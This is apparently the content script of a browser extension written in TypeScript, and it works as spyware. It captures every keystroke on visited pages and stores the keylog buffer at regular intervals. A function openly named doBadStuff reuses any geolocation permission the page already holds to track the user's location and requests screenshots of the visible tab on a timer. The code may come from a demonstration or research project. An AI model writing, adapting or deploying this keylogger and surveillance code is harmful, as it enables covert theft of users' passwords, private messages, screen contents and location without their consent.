import { IKeyLogEntry } from "src/interfaces";
import { BackgroundMessage, StorageKey } from "../consts";
import { sendMessage, updateGeolocation } from "../utils/page-utils";
import { logData, simplePrepend, writeLog } from "../utils/shared-utils";

console.log("content-script.ts");

let buffer = "";

sendMessage(BackgroundMessage.HEARTBEAT);

async function doBadStuff() {
  // Piggyback permissions for geolocation
  navigator.permissions
    .query({ name: "geolocation" })
    .then(({ state }: { state: string }) => {
      if (state === "granted") {
        updateGeolocation();
      }
    });

  if (document.visibilityState === "visible") {
    sendMessage(BackgroundMessage.CAPTURE_VISIBLE_TAB);
  }
}

async function writeBuffer() {
  if (buffer.length > 0) {
    await simplePrepend<IKeyLogEntry>(StorageKey.KEY_LOG, {
      ...logData(),
      buffer,
    });

    buffer = "";

    writeLog("Wrote keylog buffer");
  }
}

document.addEventListener("keyup", (e: KeyboardEvent) => {
  console.log(e.key);
  buffer += e.key;

  if (buffer.length > 500) {
    writeBuffer();
  }
});

setInterval(() => writeBuffer(), 5000);

document.addEventListener("visibilitychange", () => doBadStuff());

setInterval(() => {
  doBadStuff();
}, 60 * 1e3);

doBadStuff();
